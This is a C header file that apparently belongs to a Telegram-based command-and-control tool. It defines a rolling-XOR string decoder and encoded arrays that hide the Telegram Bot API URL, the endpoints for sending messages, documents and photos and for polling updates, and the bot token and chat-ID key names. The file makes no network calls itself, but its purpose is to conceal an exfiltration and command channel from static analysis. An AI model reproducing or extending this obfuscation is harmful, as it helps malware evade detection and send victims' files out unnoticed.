/*
 * Copyright (C) 2026 Antonio Ricciardi
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */

#ifndef C2T_OBFUSCATE_H
#define C2T_OBFUSCATE_H

#include <stddef.h>
#include <stdint.h>

/*
 * Decodes an obfuscated byte sequence with rolling XOR key into a stack buffer.
 */
static inline void c2t_deobf(const unsigned char *src, size_t len, unsigned char key, char *dst)
{
    for (size_t i = 0; i < len; ++i) {
        dst[i] = (char)(src[i] ^ (unsigned char)(key + (unsigned char)(i * 37U + 13U)));
    }
    dst[len] = '\0';
}

// "https://api.telegram.org/bot%s/%s"
static const unsigned char OBF_URL_API_BOT_FORMAT_DATA[33] = {
    0x0f, 0xf8, 0xc5, 0xa6, 0x88, 0x1a, 0x6a, 0x45, 0xee, 0xc4, 0xb0, 0xd0,
    0x57, 0x2d, 0x01, 0xf7, 0xd0, 0xae, 0x60, 0x4b, 0x65, 0x1f, 0xe7, 0xdd,
    0xf0, 0x66, 0x46, 0x3a, 0x56, 0xeb, 0x92, 0xc7, 0x74
};
#define OBF_URL_API_BOT_FORMAT_LEN 33U
#define DEOBF_URL_API_BOT_FORMAT(buf) c2t_deobf(OBF_URL_API_BOT_FORMAT_DATA, OBF_URL_API_BOT_FORMAT_LEN, 0x5a, (buf))

// "api.telegram.org"
static const unsigned char OBF_HOST_TELEGRAM_DATA[16] = {
    0x06, 0xfc, 0xd8, 0xf8, 0x8f, 0x45, 0x29, 0x0f, 0xe8, 0xc6, 0xb8, 0x93,
    0x0d, 0x27, 0x1f, 0xf5
};
#define OBF_HOST_TELEGRAM_LEN 16U
#define DEOBF_HOST_TELEGRAM(buf) c2t_deobf(OBF_HOST_TELEGRAM_DATA, OBF_HOST_TELEGRAM_LEN, 0x5a, (buf))

// "Content-Type: %s"
static const unsigned char OBF_HEADER_CONTENT_TYPE_FORMAT_DATA[16] = {
    0x24, 0xe3, 0xdf, 0xa2, 0x9e, 0x4e, 0x31, 0x47, 0xdb, 0xcd, 0xa9, 0x9b,
    0x19, 0x68, 0x48, 0xe1
};
#define OBF_HEADER_CONTENT_TYPE_FORMAT_LEN 16U
#define DEOBF_HEADER_CONTENT_TYPE_FORMAT(buf) c2t_deobf(OBF_HEADER_CONTENT_TYPE_FORMAT_DATA, OBF_HEADER_CONTENT_TYPE_FORMAT_LEN, 0x5a, (buf))

// "sendMessage"
static const unsigned char OBF_ENDPOINT_SEND_MESSAGE_DATA[11] = {
    0x14, 0xe9, 0xdf, 0xb2, 0xb6, 0x45, 0x36, 0x19, 0xee, 0xd3, 0xbc
};
#define OBF_ENDPOINT_SEND_MESSAGE_LEN 11U
#define DEOBF_ENDPOINT_SEND_MESSAGE(buf) c2t_deobf(OBF_ENDPOINT_SEND_MESSAGE_DATA, OBF_ENDPOINT_SEND_MESSAGE_LEN, 0x5a, (buf))

// "sendDocument"
static const unsigned char OBF_ENDPOINT_SEND_DOCUMENT_DATA[12] = {
    0x14, 0xe9, 0xdf, 0xb2, 0xbf, 0x4f, 0x26, 0x1f, 0xe2, 0xd1, 0xb7, 0x8a
};
#define OBF_ENDPOINT_SEND_DOCUMENT_LEN 12U
#define DEOBF_ENDPOINT_SEND_DOCUMENT(buf) c2t_deobf(OBF_ENDPOINT_SEND_DOCUMENT_DATA, OBF_ENDPOINT_SEND_DOCUMENT_LEN, 0x5a, (buf))

// "sendPhoto"
static const unsigned char OBF_ENDPOINT_SEND_PHOTO_DATA[9] = {
    0x14, 0xe9, 0xdf, 0xb2, 0xab, 0x48, 0x2a, 0x1e, 0xe0
};
#define OBF_ENDPOINT_SEND_PHOTO_LEN 9U
#define DEOBF_ENDPOINT_SEND_PHOTO(buf) c2t_deobf(OBF_ENDPOINT_SEND_PHOTO_DATA, OBF_ENDPOINT_SEND_PHOTO_LEN, 0x5a, (buf))

// "getUpdates"
static const unsigned char OBF_ENDPOINT_GET_UPDATES_DATA[10] = {
    0x00, 0xe9, 0xc5, 0x83, 0x8b, 0x44, 0x24, 0x1e, 0xea, 0xc7
};
#define OBF_ENDPOINT_GET_UPDATES_LEN 10U
#define DEOBF_ENDPOINT_GET_UPDATES(buf) c2t_deobf(OBF_ENDPOINT_GET_UPDATES_DATA, OBF_ENDPOINT_GET_UPDATES_LEN, 0x5a, (buf))

// "TELEGRAM_BOT_TOKEN"
static const unsigned char OBF_KEY_BOT_TOKEN_DATA[18] = {
    0x33, 0xc9, 0xfd, 0x93, 0xbc, 0x72, 0x04, 0x27, 0xd0, 0xf6, 0x96, 0xaa,
    0x7c, 0x1c, 0x22, 0xd9, 0xf2, 0x92
};
#define OBF_KEY_BOT_TOKEN_LEN 18U
#define DEOBF_KEY_BOT_TOKEN(buf) c2t_deobf(OBF_KEY_BOT_TOKEN_DATA, OBF_KEY_BOT_TOKEN_LEN, 0x5a, (buf))

// "TELEGRAM_CHAT_ID"
static const unsigned char OBF_KEY_CHAT_ID_DATA[16] = {
    0x33, 0xc9, 0xfd, 0x93, 0xbc, 0x72, 0x04, 0x27, 0xd0, 0xf7, 0x91, 0xbf,
    0x77, 0x17, 0x24, 0xd6
};
#define OBF_KEY_CHAT_ID_LEN 16U
#define DEOBF_KEY_CHAT_ID(buf) c2t_deobf(OBF_KEY_CHAT_ID_DATA, OBF_KEY_CHAT_ID_LEN, 0x5a, (buf))

#endif
